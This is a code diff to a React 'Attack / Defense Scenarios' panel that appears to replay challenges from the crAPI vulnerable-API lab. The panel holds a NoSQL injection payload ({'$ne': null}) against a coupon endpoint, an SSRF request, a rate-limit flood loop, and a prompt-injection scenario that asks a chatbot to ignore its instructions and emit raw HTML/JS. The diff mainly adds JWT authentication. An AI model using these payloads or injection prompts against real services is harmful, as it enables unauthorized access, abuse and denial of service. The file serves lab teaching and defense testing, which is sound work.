@@ -1,9 +1,16 @@
 import { useState } from 'react';
 
+const authHeaders = (token) => {
+  const headers = { 'Content-Type': 'application/json' };
+  if (token) headers.Authorization = `Bearer ${token}`;
+  return headers;
+};
+
 const SCENARIOS = [
   {
     title: 'Rate-limit DoS (Challenge 6)',
     description: 'Hammer the gateway proxy path to trigger Kong rate limiting.',
+    requiresAuth: false,
     action: async () => {
       const codes = [];
       for (let i = 0; i < 12; i++) {
@@ -16,11 +23,26 @@ const SCENARIOS = [
   {
     title: 'SSRF / mechanic blocked at gateway (Challenge 11)',
     description: 'POST to /workshop/api/merchant/contact_mechanic through the gateway. Should return 403.',
-    action: async () => {
+    requiresAuth: true,
+    action: async (token) => {
       const res = await fetch('/gateway/workshop/api/merchant/contact_mechanic', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: authHeaders(token),
         body: JSON.stringify({ mechanic_api: 'http://www.google.com/' }),
+      });
+      const text = await res.text();
+      return `HTTP ${res.status}\n${text}`;
+    },
+  },
+  {
+    title: 'NoSQL coupon injection (Challenge 12)',
+    description: 'Send {"coupon_code": {"$ne": null}} to the community coupon endpoint.',
+    requiresAuth: true,
+    action: async (token) => {
+      const res = await fetch('/community/api/v2/coupon/validate-coupon', {
+        method: 'POST',
+        headers: authHeaders(token),
+        body: JSON.stringify({ coupon_code: { $ne: null } }),
       });
       const text = await res.text();
       return `HTTP ${res.status}\n${text}`;
@@ -29,6 +51,7 @@ const SCENARIOS = [
   {
     title: 'Prompt injection (Challenge 16)',
     description: 'Ask the chatbot to ignore instructions and output raw HTML/JS.',
+    requiresAuth: false,
     action: async () => {
       const res = await fetch('/chatbot/genai/ask', {
         method: 'POST',
@@ -39,29 +62,17 @@ const SCENARIOS = [
       return data.response || JSON.stringify(data, null, 2);
     },
   },
-  {
-    title: 'NoSQL coupon injection (Challenge 12)',
-    description: 'Send {"coupon_code": {"$ne": null}} to the community coupon endpoint.',
-    action: async () => {
-      const res = await fetch('/community/api/v2/coupon/validate-coupon', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ coupon_code: { $ne: null } }),
-      });
-      const text = await res.text();
-      return `HTTP ${res.status}\n${text}`;
-    },
-  },
 ];
 
 function Scenarios() {
   const [results, setResults] = useState({});
   const [loading, setLoading] = useState({});
+  const [token, setToken] = useState('');
 
   const run = async (scenario, index) => {
     setLoading((l) => ({ ...l, [index]: true }));
     try {
-      const out = await scenario.action();
+      const out = await scenario.action(token);
       setResults((r) => ({ ...r, [index]: out }));
     } catch (err) {
       setResults((r) => ({ ...r, [index]: `Error: ${err.message}` }));
@@ -74,6 +85,16 @@ function Scenarios() {
     <div className="scenarios card">
       <h2>Attack / Defense Scenarios</h2>
       <p>Click a scenario to replay it. Observe the live API responses.</p>
+      <div className="token-input">
+        <label htmlFor="jwt-token">JWT token (required for authenticated scenarios):</label>
+        <input
+          id="jwt-token"
+          type="text"
+          value={token}
+          onChange={(e) => setToken(e.target.value)}
+          placeholder="Paste a crAPI JWT here"
+        />
+      </div>
       {SCENARIOS.map((s, i) => (
         <div key={i} className="scenario">
           <div className="scenario-header">
@@ -82,7 +103,7 @@ function Scenarios() {
               {loading[i] ? 'Running…' : 'Run'}
             </button>
           </div>
-          <p>{s.description}</p>
+          <p>{s.description}{s.requiresAuth && <span className="jwt-required"> — JWT required</span>}</p>
           {results[i] && <pre>{results[i]}</pre>}
         </div>
       ))}
